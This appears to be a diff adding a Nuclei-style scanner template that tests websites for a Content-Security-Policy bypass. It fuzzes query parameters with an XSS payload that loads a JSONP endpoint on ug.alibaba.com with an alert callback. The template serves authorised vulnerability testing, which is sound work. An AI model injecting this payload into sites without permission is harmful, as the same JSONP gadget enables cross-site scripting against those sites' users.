@@ -1,0 +1,55 @@
+id: alibaba-ug-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Alibaba UG
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,alibaba-ug
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "alibaba.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: alibaba_ug_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "alibaba_ug_csp_xss == true"
+# digest: 490a0046304402202851555e9a452a91560a0ad520a8f3294ae82909165316e1cadb3b7e367dab9a0220361a0a318dc82e687f026c9137d213bbb3461164b3d09e973f30a7a991f74a45:922c64590222798bb761d5b6d8e72950
